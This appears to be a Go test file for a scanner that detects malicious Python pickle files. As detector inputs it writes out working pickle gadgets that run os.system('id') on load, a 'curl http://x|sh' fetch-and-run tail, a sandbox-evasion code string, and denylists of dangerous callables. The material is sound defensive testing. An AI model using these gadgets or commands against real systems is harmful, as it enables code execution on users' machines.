@@ -1,0 +1,648 @@
+package pickle
+
+import (
+	"encoding/binary"
+	"math"
+	"sort"
+	"strings"
+	"testing"
+
+	"github.com/fr0g-66723067-io/sc4n/internal/artifact"
+	"github.com/fr0g-66723067-io/sc4n/internal/limits"
+	"github.com/fr0g-66723067-io/sc4n/internal/report"
+	"github.com/fr0g-66723067-io/sc4n/internal/source"
+)
+
+func walk(t *testing.T, data []byte) (*Stream, []report.Finding) {
+	t.Helper()
+	return walkOpt(t, data, Options{}, limits.Default())
+}
+
+func walkOpt(t *testing.T, data []byte, opt Options, l limits.Limits) (*Stream, []report.Finding) {
+	t.Helper()
+	c := report.NewCollector(0)
+	sess := artifact.NewSession(c, "", l)
+	src := source.Mem("test.pkl", data)
+	defer src.Close()
+	st, err := Walk(sess.NewCtx("test.pkl", l), src, opt)
+	if err != nil {
+		t.Fatalf("Walk: %v", err)
+	}
+	return st, c.Findings()
+}
+
+// binUnicode builds a BINUNICODE opcode: a 4-byte little-endian length and the
+// payload. The earlier form of these tests wrote a 1-byte length, which made the
+// stream malformed and the test measure the wrong thing.
+func binUnicode(s string) []byte {
+	out := []byte{opBINUNICODE, 0, 0, 0, 0}
+	binary.LittleEndian.PutUint32(out[1:], uint32(len(s)))
+	return append(out, s...)
+}
+
+func ruleIDs(fs []report.Finding) []string {
+	out := make([]string, 0, len(fs))
+	for _, f := range fs {
+		out = append(out, f.RuleID)
+	}
+	sort.Strings(out)
+	return out
+}
+
+func hasRule(fs []report.Finding, id string) bool {
+	for _, f := range fs {
+		if f.RuleID == id {
+			return true
+		}
+	}
+	return false
+}
+
+func mustHave(t *testing.T, fs []report.Finding, ids ...string) {
+	t.Helper()
+	for _, id := range ids {
+		if !hasRule(fs, id) {
+			t.Fatalf("missing %s; findings = %v", id, ruleIDs(fs))
+		}
+	}
+}
+
+func mustNotHave(t *testing.T, fs []report.Finding, ids ...string) {
+	t.Helper()
+	for _, id := range ids {
+		if hasRule(fs, id) {
+			t.Fatalf("unexpected %s; findings = %v", id, ruleIDs(fs))
+		}
+	}
+}
+
+// TestOpcodeConstantsMatchTable keeps the named constants and the generated table
+// from drifting: a wrong constant would silently mis-decode a stream.
+func TestOpcodeConstantsMatchTable(t *testing.T) {
+	for code, want := range opcodeConstants {
+		if got := opTable[code].name; got != want {
+			t.Errorf("constant 0x%02x is %s but the table entry is %q", code, want, got)
+		}
+	}
+	if len(opcodeConstants) != 68 {
+		t.Fatalf("the table has %d entries but %d constants are declared", len(opTable), len(opcodeConstants))
+	}
+	// Every opcode in the table must have a stack effect: the walker's default
+	// branch reports "unhandled-opcode", so an opcode that reaches it is a bug.
+	for code := 0; code < 256; code++ {
+		if opTable[code].name == "" {
+			continue
+		}
+		if _, handled := opcodeConstants[byte(code)]; !handled {
+			t.Errorf("opcode %s (0x%02x) is in the table but has no constant", opTable[code].name, code)
+		}
+	}
+}
+
+// argumentBytes returns a minimal valid argument for each kind, which lets the test
+// exercise every row of the decode switch instead of a hand-picked sample.
+func argumentBytes(kind argKind) []byte {
+	switch kind {
+	case argNone:
+		return nil
+	case argUint1:
+		return []byte{0x07}
+	case argUint2:
+		return []byte{0x07, 0x00}
+	case argUint4, argInt4:
+		return []byte{0x07, 0x00, 0x00, 0x00}
+	case argUint8:
+		return []byte{0x07, 0, 0, 0, 0, 0, 0, 0}
+	case argFloat8:
+		var b [8]byte
+		binary.BigEndian.PutUint64(b[:], math.Float64bits(1.5))
+		return b[:]
+	case argDecimalnlShort:
+		return []byte("12\n")
+	case argDecimalnlLong:
+		return []byte("12L\n")
+	case argFloatnl:
+		return []byte("1.5\n")
+	case argStringnl:
+		return []byte("'ab'\n")
+	case argStringnlNoescape, argUnicodestringnl:
+		return []byte("ab\n")
+	case argStringnlNoescapePair:
+		return []byte("mod\nname\n")
+	case argString1, argBytes1, argUnicodestring1:
+		return []byte{0x02, 'a', 'b'}
+	case argString4, argBytes4, argUnicodestring4, argLong4:
+		return []byte{0x02, 0, 0, 0, 0xff, 0x00}
+	case argBytes8, argBytearray8, argUnicodestring8:
+		return []byte{0x02, 0, 0, 0, 0, 0, 0, 0, 'a', 'b'}
+	case argLong1:
+		return []byte{0x02, 0xff, 0x00}
+	default:
+		return nil
+	}
+}
+
+// TestDecodeArgCoversEveryKind drives the decoder with one valid argument per kind
+// used by the table, and asserts that the decoder consumes exactly that argument.
+func TestDecodeArgCoversEveryKind(t *testing.T) {
+	seen := map[argKind]bool{}
+	for code := 0; code < 256; code++ {
+		info := opTable[code]
+		if info.name == "" {
+			continue
+		}
+		if seen[info.arg] {
+			continue
+		}
+		seen[info.arg] = true
+		arg := argumentBytes(info.arg)
+		// decodeArg is called with pos pointing at the opcode byte, so the data
+		// carries a filler opcode byte in front of the argument.
+		data := append([]byte{info.name[0]}, arg...)
+		w := &walker{data: data, lim: limits.Default(), mm: newMemo(), once: map[string]bool{}, structs: map[string]*structStat{}}
+		got, next, err := w.decodeArg(info, 0)
+		if err != nil {
+			t.Errorf("argKind %d (%s) failed to decode: %v", info.arg, info.name, err)
+			continue
+		}
+		if next != 1+len(arg) {
+			t.Errorf("argKind %d (%s) consumed %d of %d bytes", info.arg, info.name, next, 1+len(arg))
+		}
+		if info.arg != argNone && got == nil {
+			t.Errorf("argKind %d (%s) decoded to nil", info.arg, info.name)
+		}
+	}
+	// Every kind the enum declares must be reachable from the table, or the walker
+	// carries a branch no stream can reach.
+	for k := argNone; k <= argLong4; k++ {
+		if !seen[k] {
+			t.Errorf("argKind %d is declared but no opcode uses it", k)
+		}
+	}
+}
+
+func TestBINFLOATIsBigEndian(t *testing.T) {
+	var b [8]byte
+	binary.BigEndian.PutUint64(b[:], math.Float64bits(1.5))
+	data := append([]byte{opBINFLOAT}, b[:]...)
+	w := &walker{data: data, lim: limits.Default(), mm: newMemo(), once: map[string]bool{}, structs: map[string]*structStat{}}
+	got, next, err := w.decodeArg(opTable[opBINFLOAT], 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if next != 9 {
+		t.Fatalf("consumed %d bytes, want the opcode byte plus eight", next)
+	}
+	f, ok := got.(float64)
+	if !ok || f != 1.5 {
+		t.Fatalf("decoded %v, want 1.5 (BINFLOAT is the one big-endian fixed arg)", got)
+	}
+	// The little-endian reading of the same bytes is a different number, so a
+	// little-endian implementation cannot pass this test.
+	little := math.Float64frombits(binary.LittleEndian.Uint64(b[:]))
+	if little == 1.5 {
+		t.Fatal("the test bytes do not discriminate endianness")
+	}
+}
+
+func TestNegativeAndTruncatedCountsAreStructuralViolations(t *testing.T) {
+	// SHORT_BINUNICODE declares 200 bytes but carries none.
+	data := append([]byte{opSHORT_BINUNICODE, 200}, []byte("ab")...)
+	_, fs := walk(t, append([]byte{opPROTO, 4}, data...))
+	if !hasRule(fs, "SC4N-PICKLE-STRUCT") || !hasRule(fs, "SC4N-PICKLE-INCOMPLETE") {
+		t.Fatalf("truncated counted argument not reported: %v", ruleIDs(fs))
+	}
+
+	// LONG4 with a negative count (int4).
+	neg := []byte{opPROTO, 2, opLONG4, 0xff, 0xff, 0xff, 0xff}
+	_, fs = walk(t, neg)
+	found := false
+	for _, f := range fs {
+		if f.RuleID == "SC4N-PICKLE-STRUCT" && strings.Contains(f.Evidence, "negative") {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("negative LONG4 count not reported: %v", ruleIDs(fs))
+	}
+}
+
+// TestWalkIsTotalAcrossMalformedBytes is the anti-evasion property: findings after
+// a structural error must still be reported.
+func TestWalkIsTotalAcrossMalformedBytes(t *testing.T) {
+	// An unknown opcode followed by a genuine gadget: the walker must report the
+	// gadget, not stop at the unknown byte.
+	payload := append([]byte{opPROTO, 2, 0xff, 0xfe, 0xfd}, []byte("cos\nsystem\n(S'id'\ntR.")...)
+	_, fs := walk(t, payload)
+	mustHave(t, fs, "SC4N-PICKLE-STRUCT", "SC4N-PICKLE-INCOMPLETE", "SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-REDUCE")
+}
+
+func TestSegmentAndTrailingHandling(t *testing.T) {
+	seg1 := []byte{opPROTO, 2, opEMPTY_DICT, opSTOP}
+	seg2 := []byte{opPROTO, 4, opSHORT_BINUNICODE, 2, 'o', 's', opSHORT_BINUNICODE, 6, 's', 'y', 's', 't', 'e', 'm', opSTACK_GLOBAL, opSHORT_BINUNICODE, 2, 'i', 'd', opTUPLE1, opREDUCE, opSTOP}
+
+	_, fs := walk(t, append(append([]byte{}, seg1...), seg2...))
+	mustHave(t, fs, "SC4N-PICKLE-SEGMENT", "SC4N-PICKLE-GLOBAL-CRITICAL")
+
+	// The same stream with a payload after STOP that is not a pickle.
+	withTail := append(append([]byte{}, seg1...), []byte("#!/bin/sh\ncurl http://x|sh\n")...)
+	_, fs = walk(t, withTail)
+	mustHave(t, fs, "SC4N-PICKLE-TRAILING")
+	for _, f := range fs {
+		if f.RuleID == "SC4N-PICKLE-TRAILING" && !strings.Contains(f.Evidence, "shebang") {
+			t.Fatalf("trailing evidence does not mention the shebang: %s", f.Evidence)
+		}
+	}
+
+	// With TrailingIsStorage the container owns the tail and no trailing finding is
+	// emitted: this is the legacy-torch and joblib contract.
+	_, fs = walkOpt(t, withTail, Options{TrailingIsStorage: true, StorageDescription: "raw storage"}, limits.Default())
+	mustNotHave(t, fs, "SC4N-PICKLE-TRAILING")
+	mustNotHave(t, fs, "SC4N-PICKLE-SEGMENT")
+}
+
+func TestPrefixAndOffsetZero(t *testing.T) {
+	gadget := append([]byte{opPROTO, 4}, []byte{opSHORT_BINUNICODE, 2, 'o', 's', opSHORT_BINUNICODE, 6, 's', 'y', 's', 't', 'e', 'm', opSTACK_GLOBAL, opSHORT_BINUNICODE, 2, 'i', 'd', opTUPLE1, opREDUCE, opSTOP}...)
+
+	// A prefix that is plain text and cannot be confused with opcodes.
+	prefixed := append([]byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"), gadget...)
+	_, fs := walk(t, prefixed)
+	mustHave(t, fs, "SC4N-PICKLE-PREFIX", "SC4N-PICKLE-GLOBAL-CRITICAL")
+
+	// The protocol-0 gadget opens with GLOBAL at offset 0.
+	_, fs = walk(t, []byte("cos\nsystem\n(S'id'\ntR."))
+	mustHave(t, fs, "SC4N-PICKLE-OFFSET-ZERO", "SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-REDUCE")
+
+	// A stream that merely starts with 'c' as ordinary text must not be claimed as
+	// a pickle by the sniffer, so the walker's own findings are not what protects
+	// this case: TestSniffRejectsSourceText covers the sniffer.
+}
+
+func TestFRAMEIsNotEnforced(t *testing.T) {
+	// FRAME declares 4 bytes but the stream after it is longer; the reference
+	// unpickler reads the length and then keeps reading, so enforcing it would
+	// diverge from the loader and make the file look clean when it is not.
+	data := []byte{opPROTO, 4, opFRAME}
+	var fr [8]byte
+	binary.LittleEndian.PutUint64(fr[:], 4)
+	data = append(data, fr[:]...)
+	data = append(data, []byte("cos\nsystem\n(S'id'\ntR.")...)
+	_, fs := walk(t, data)
+	mustHave(t, fs, "SC4N-PICKLE-GLOBAL-CRITICAL")
+	// And no rule is emitted for FRAME itself.
+	for _, f := range fs {
+		if strings.Contains(f.Evidence, "FRAME") {
+			t.Fatalf("FRAME produced a finding: %s", f.Evidence)
+		}
+	}
+}
+
+func TestProtoGating(t *testing.T) {
+	// MEMOIZE is a protocol-4 opcode inside a stream that declares protocol 2.
+	data := []byte{opPROTO, 2, opEMPTY_DICT, opMEMOIZE, opSTOP}
+	_, fs := walk(t, data)
+	found := false
+	for _, f := range fs {
+		if f.RuleID == "SC4N-PICKLE-STRUCT" && strings.Contains(f.Evidence, "proto-violation") {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("protocol violation not reported: %v", ruleIDs(fs))
+	}
+
+	// A protocol 0/1 stream must not contain protocol-4 opcodes either.
+	_, fs = walk(t, []byte{opEMPTY_DICT, opMEMOIZE, opSTOP})
+	if !hasRule(fs, "SC4N-PICKLE-STRUCT") {
+		t.Fatalf("protocol-4 opcode in a protocol-0 stream not reported: %v", ruleIDs(fs))
+	}
+}
+
+func TestStackDepthBudgetStopsTheWalk(t *testing.T) {
+	l := limits.Default()
+	l.MaxStackDepth = 4
+	data := []byte{opPROTO, 2}
+	for range 10 {
+		data = append(data, opEMPTY_DICT)
+	}
+	data = append(data, opSTOP)
+	_, fs := walkOpt(t, data, Options{}, l)
+	mustHave(t, fs, "SC4N-PICKLE-STACK")
+}
+
+func TestMemoHoleAndUnderflow(t *testing.T) {
+	// GET(9) with nothing in the memo.
+	_, fs := walk(t, []byte{opPROTO, 2, opBINPUT, 9, opSTOP})
+	mustHave(t, fs, "SC4N-PICKLE-STRUCT")
+
+	_, fs = walk(t, []byte{opPROTO, 2, opREDUCE, opSTOP})
+	mustHave(t, fs, "SC4N-PICKLE-STRUCT")
+}
+
+func TestCodeStringRuleRequiresBothSignalAndLength(t *testing.T) {
+	cases := []struct {
+		text string
+		want bool
+	}{
+		{"if not 'hypervisor' in open('/proc/cpuinfo').read(): import os; os.system('id')", true},
+		{"__import__('os').system('id')", true},
+		{"for x in range(10): print(x)", true},
+		{"model_type", false},
+		{"bert-base-uncased", false},
+		{"This is a description of the model, stored as metadata.", false},
+		{"short", false},
+	}
+	for _, tc := range cases {
+		got := looksLikeCode(tc.text) != ""
+		if got != tc.want {
+			t.Errorf("looksLikeCode(%q) = %v, want %v", tc.text, got, tc.want)
+		}
+	}
+}
+
+func TestAllowlistPolicy(t *testing.T) {
+	cases := []struct {
+		module, name string
+		want         AllowVerdict
+	}{
+		{"collections", "OrderedDict", AllowDefault},
+		{"torch.nn.parameter", "Parameter", AllowDefault},
+		{"torch", "Tensor", AllowDefault},
+		{"torch._utils", "_rebuild_tensor_v2", AllowDefault},
+		{"torch", "float32", AllowDefault},
+		{"torch", "uint7", AllowDefault},
+		{"torch", "DoubleStorage", AllowDefault},
+		{"torch", "per_channel_affine", AllowDefault},
+		{"_codecs", "encode", AllowDefault},
+		{"builtins", "bytearray", AllowDefault},
+		{"builtins", "complex", AllowDefault},
+		{"torch._tensor", "_rebuild_from_type_v2", AllowDefault},
+		// The nested/DTensor families are accepted only when the owning submodule
+		// is imported, which a static scan cannot see.
+		{"torch.distributed.tensor", "DTensor", AllowConditional},
+		// Blocked modules are checked before the allowlist, so even an
+		// allowlist-looking name in them is never loadable.
+		{"os", "OrderedDict", AllowBlocked},
+		{"posix", "system", AllowBlocked},
+		{"sys", "modules", AllowBlocked},
+		{"nt", "system", AllowBlocked},
+		// Everything else is outside the allowlist.
+		{"numpy", "load", AllowNo},
+		{"subprocess", "Popen", AllowNo},
+		{"pickle", "loads", AllowNo},
+	}
+	for _, tc := range cases {
+		if got := isAllowed(tc.module, tc.name); got != tc.want {
+			t.Errorf("isAllowed(%s.%s) = %s, want %s", tc.module, tc.name, got, tc.want)
+		}
+	}
+}
+
+func TestNameMappingMatchesTheLoader(t *testing.T) {
+	cases := []struct {
+		module, name         string
+		wantModule, wantName string
+		wantRemapped         bool
+	}{
+		{"__builtin__", "xrange", "builtins", "range", true},
+		{"__builtin__", "unicode", "builtins", "str", true},
+		{"UserDict", "IterableUserDict", "collections", "UserDict", true},
+		{"StringIO", "StringIO", "io", "StringIO", true},
+		{"torch._utils", "_rebuild_tensor_v2", "torch._utils", "_rebuild_tensor_v2", false},
+	}
+	for _, tc := range cases {
+		m, n, remapped := resolveGlobal(tc.module, tc.name)
+		if m != tc.wantModule || n != tc.wantName || remapped != tc.wantRemapped {
+			t.Errorf("resolveGlobal(%s.%s) = %s.%s (remapped %v), want %s.%s (%v)",
+				tc.module, tc.name, m, n, remapped, tc.wantModule, tc.wantName, tc.wantRemapped)
+		}
+	}
+}
+
+// TestGadgetSubtreeMatching is the CVE-2025-10157 regression: an exact-module check
+// let asyncio.subprocess slip past a denylist entry for asyncio.
+func TestGadgetSubtreeMatching(t *testing.T) {
+	cases := []struct {
+		module, name string
+		want         GadgetClass
+	}{
+		{"asyncio.subprocess", "create_subprocess_shell", GadgetDirect},
+		{"asyncio", "subprocess", GadgetDirect},
+		{"asyncio", "get_event_loop", GadgetDirect},
+		{"numpy.f2py.crackfortran", "myeval", GadgetLibrary},
+		{"numpy.f2py.crackfortran.myeval", "inner", GadgetLibrary},
+		{"numpy.testing._private.utils", "runstring", GadgetLibrary},
+		{"pydoc", "pipepager", GadgetLibrary},
+		{"logging.config", "_install_handlers", GadgetLibrary},
+		{"xmlrpc.server", "resolve_dotted_attribute", GadgetLibrary},
+		{"sympy", "sympify", GadgetLibrary},
+		{"numpy.f2py.capi_maps", "getinit", GadgetLibrary},
+		{"pickletools", "genops", GadgetLibrary},
+		{"functools", "reduce", GadgetDirect},
+		{"builtins", "eval", GadgetDirect},
+		{"posix", "system", GadgetDirect},
+		{"sympy", "sympify", GadgetLibrary},
+		{"zlib", "decompress", GadgetLibrary},
+		{"base64", "b64decode", GadgetLibrary},
+		{"numpy", "array", GadgetUnknownCallable},
+		{"sklearn.ensemble", "_forest", GadgetUnknownCallable},
+	}
+	for _, tc := range cases {
+		got := classifyGadget(tc.module, tc.name)
+		if got.Class != tc.want {
+			t.Errorf("classifyGadget(%s.%s) = %s (%s), want %s",
+				tc.module, tc.name, got.Class, got.Entry, tc.want)
+		}
+	}
+
+	// Every table entry must be reachable through subtree matching, and the
+	// subtree rule must be what makes it reachable: a module that is a prefix of a
+	// denylisted package but not inside it must not match.
+	if !moduleSubtreeMatches("os.path", "os") {
+		t.Fatal("os.path must match the os subtree")
+	}
+	if moduleSubtreeMatches("oscar", "os") {
+		t.Fatal("a module that merely starts with the same letters must not match")
+	}
+}
+
+func TestPersistentIDShape(t *testing.T) {
+	storageTuple := containerOf(kTuple, []Val{{kind: kStr, text: "storage"}, {kind: kStr, text: "FloatStorage"}}, 2)
+	if !isPersistentStorageID(storageTuple) {
+		t.Fatal("the (\"storage\", …) tuple must be accepted")
+	}
+	other := containerOf(kTuple, []Val{{kind: kStr, text: "elsewhere"}}, 1)
+	if isPersistentStorageID(other) {
+		t.Fatal("a non-storage persistent id must be rejected")
+	}
+	if !isPersistentStorageID(Val{kind: kInt, text: "3"}) {
+		t.Fatal("the loader accepts a bare int persistent id, and the walker must model that")
+	}
+	if isPersistentStorageID(Val{kind: kList}) {
+		t.Fatal("a list persistent id must be rejected")
+	}
+
+	// The rule must fire for a non-storage persistent id.
+	_, fs := walk(t, []byte{opPROTO, 2, opEMPTY_TUPLE, opBINPERSID, opSTOP})
+	mustHave(t, fs, "SC4N-PICKLE-PERSID")
+}
+
+func TestWeightsOnlyOpcodeSet(t *testing.T) {
+	accepted := []byte{opPROTO, opSTOP, opGLOBAL, opREDUCE, opBUILD, opEMPTY_DICT, opSETITEMS, opBINUNICODE, opBININT, opBINGET, opBINPUT, opBINPERSID, opLONG1, opNEWOBJ, opAPPEND, opAPPENDS, opSETITEM, opMARK, opTUPLE, opTUPLE1, opTUPLE2, opTUPLE3, opNONE, opNEWTRUE, opNEWFALSE, opEMPTY_TUPLE, opEMPTY_LIST, opEMPTY_SET, opBININT1, opBININT2, opBINFLOAT, opLONG_BINPUT, opLONG_BINGET}
+	for _, code := range accepted {
+		if requiresUnsafeLoader(code) {
+			t.Errorf("%s must be inside the weights-only accepted set", opTable[code].name)
+		}
+	}
+	unsafe := []byte{opSTACK_GLOBAL, opINST, opOBJ, opNEWOBJ_EX, opEXT1, opEXT2, opEXT4, opPERSID, opFRAME, opMEMOIZE, opLONG4, opBINBYTES, opBINUNICODE8, opBYTEARRAY8, opNEXT_BUFFER, opREADONLY_BUFFER, opSHORT_BINUNICODE, opSHORT_BINBYTES, opDUP, opPOP, opPUT, opGET, opLIST, opDICT, opFROZENSET, opADDITEMS, opSTRING, opBINSTRING, opUNICODE, opLONG, opINT, opFLOAT}
+	for _, code := range unsafe {
+		if !requiresUnsafeLoader(code) {
+			t.Errorf("%s must be outside the weights-only accepted set", opTable[code].name)
+		}
+	}
+}
+
+func TestSafeGlobalsOnlyFiresWhenNothingIsAllowlisted(t *testing.T) {
+	// A stream whose only global is allowlisted must not ask the user for anything.
+	data := append([]byte{opPROTO, 2}, []byte("ctorch._utils\n_rebuild_tensor_v2\n")...)
+	data = append(data, opSTOP)
+	_, fs := walk(t, data)
+	mustNotHave(t, fs, "SC4N-PICKLE-SAFE-GLOBALS")
+	mustNotHave(t, fs, "SC4N-PICKLE-GLOBAL-UNKNOWN", "SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-GLOBAL-HIGH")
+
+	// A stream whose only global is unknown must.
+	_, fs = walk(t, []byte{opPROTO, 2, opGLOBAL, 'a', 'b', '\n', 'c', 'd', '\n', opSTOP})
+	mustHave(t, fs, "SC4N-PICKLE-SAFE-GLOBALS", "SC4N-PICKLE-GLOBAL-UNKNOWN")
+}
+
+func TestOneGlobalProducesOneFinding(t *testing.T) {
+	// A state_dict references one rebuild function once per tensor. The finding
+	// list must name it once, or a 300-tensor checkpoint produces 300 identical
+	// findings and the finding cap becomes the report.
+	data := []byte{opPROTO, 2, opEMPTY_DICT, opMARK}
+	for i := range 20 {
+		data = append(data, binUnicode("k"+string(rune('a'+i)))...)
+		data = append(data, []byte("ctorch._utils\n_rebuild_tensor_v2\n")...)
+		data = append(data, opEMPTY_TUPLE, opREDUCE)
+	}
+	data = append(data, opSETITEMS, opSTOP)
+	_, fs := walk(t, data)
+	n := 0
+	for _, f := range fs {
+		if f.RuleID == "SC4N-PICKLE-GLOBAL-UNKNOWN" {
+			n++
+		}
+	}
+	if n != 0 {
+		t.Fatalf("allowlisted global reported %d times", n)
+	}
+	for _, f := range fs {
+		if f.RuleID == "SC4N-PICKLE-REDUCE" {
+			t.Fatalf("an allowlisted REDUCE must not be reported: %s", f.Evidence)
+		}
+	}
+}
+
+func TestBuildOnAllowlistedClassIsNotReported(t *testing.T) {
+	// Tensor + BUILD is the legitimate legacy-unpickling path.
+	data := []byte{opPROTO, 2}
+	data = append(data, []byte("ctorch\nTensor\n")...)
+	data = append(data, opEMPTY_DICT, opBUILD, opSTOP)
+	_, fs := walk(t, data)
+	mustNotHave(t, fs, "SC4N-PICKLE-BUILD-STATE")
+
+	// A BUILD on an unknown class is a rejection.
+	data = []byte{opPROTO, 2}
+	data = append(data, []byte("cnumpy.core.multiarray\n_reconstruct\n")...)
+	data = append(data, opEMPTY_DICT, opBUILD, opSTOP)
+	_, fs = walk(t, data)
+	mustHave(t, fs, "SC4N-PICKLE-BUILD-STATE")
+}
+
+func TestAppendTarget(t *testing.T) {
+	data := append([]byte{opPROTO, 2, opEMPTY_DICT}, binUnicode("x")...)
+	data = append(data, opAPPEND, opSTOP)
+	_, fs := walk(t, data)
+	mustHave(t, fs, "SC4N-PICKLE-APPEND-TARGET")
+}
+
+func TestUnescape(t *testing.T) {
+	got, err := unescape([]byte(`a\x41\n\t\\z`))
+	if err != nil {
+		t.Fatalf("unescape: %v", err)
+	}
+	if string(got) != "aA\n\t\\z" {
+		t.Fatalf("unescape = %q", got)
+	}
+	// An unknown escape is reported and kept verbatim rather than aborting.
+	got, err = unescape([]byte(`a\qz`))
+	if err == nil {
+		t.Fatal("an unknown escape must be reported")
+	}
+	if string(got) != `a\qz` {
+		t.Fatalf("an unknown escape must be kept verbatim so the walk continues, got %q", got)
+	}
+}
+
+func TestSniffAcceptsPicklesAndRejectsSourceText(t *testing.T) {
+	cases := []struct {
+		name string
+		data []byte
+		want bool
+	}{
+		{"proto4 gadget", append([]byte{opPROTO, 4}, []byte{opSHORT_BINUNICODE, 2, 'o', 's', opSHORT_BINUNICODE, 6, 's', 'y', 's', 't', 'e', 'm', opSTACK_GLOBAL, opSHORT_BINUNICODE, 2, 'i', 'd', opTUPLE1, opREDUCE, opSTOP}...), true},
+		{"proto0 gadget", []byte("cos\nsystem\n(S'id'\ntR."), true},
+		{"python source", []byte("class Foo:\n    def bar(self):\n        return 1\n"), false},
+		{"python source with c", []byte("copy the file\nand then\n"), false},
+		{"empty", nil, false},
+		{"one byte", []byte{opPROTO}, false},
+		{"proto out of range", []byte{opPROTO, 99, opSTOP}, false},
+		{"text", []byte("hello world, this is a readme\n"), false},
+	}
+	for _, tc := range cases {
+		s := source.Mem(tc.name, tc.data)
+		got, ok := sniff(s, limits.Default())
+		s.Close()
+		if ok != tc.want || (ok && got != artifact.FormatPickle) {
+			t.Errorf("sniff(%s) = %s, %v; want pickle=%v", tc.name, got, ok, tc.want)
+		}
+	}
+}
+
+func FuzzPickleWalk(f *testing.F) {
+	f.Add([]byte("cos\nsystem\n(S'id'\ntR."))
+	f.Add([]byte{opPROTO, 4, opEMPTY_DICT, opSTOP})
+	f.Add([]byte{opPROTO, 2, opEMPTY_DICT, opMEMOIZE, opBINPUT, 3, opGET, 3, opSTOP})
+	f.Add([]byte{opPROTO, 4, opFRAME, 0, 0, 0, 0, 0, 0, 0, 0, opSTOP})
+	f.Add([]byte{opPROTO, 5, opSHORT_BINUNICODE, 3, 'a', 'b', 'c', opNEXT_BUFFER, opREADONLY_BUFFER, opSTOP})
+	f.Add([]byte{opMARK, opMARK, opTUPLE, opSTOP})
+	f.Add([]byte{opPROTO, 2, opBINUNICODE, 0xff, 0xff, 0xff, 0xff})
+	f.Fuzz(func(t *testing.T, data []byte) {
+		if len(data) > 1<<16 {
+			return
+		}
+		c := report.NewCollector(0)
+		l := limits.Default()
+		l.MaxStackDepth = 4096
+		sess := artifact.NewSession(c, "", l)
+		src := source.Mem("fuzz", data)
+		defer src.Close()
+		// The invariants are: no panic, bounded work, and a deterministic result.
+		first, err := Walk(sess.NewCtx("fuzz", l), src, Options{})
+		if err != nil {
+			t.Fatalf("Walk: %v", err)
+		}
+		if first.Ops > 1<<20 {
+			t.Fatalf("opcode count %d for %d bytes", first.Ops, len(data))
+		}
+		c2 := report.NewCollector(0)
+		sess2 := artifact.NewSession(c2, "", l)
+		second, err := Walk(sess2.NewCtx("fuzz", l), src, Options{})
+		if err != nil {
+			t.Fatalf("second Walk: %v", err)
+		}
+		if first.Ops != second.Ops || first.Segments != second.Segments {
+			t.Fatalf("Walk is not deterministic: %+v vs %+v", first, second)
+		}
+	})
+}
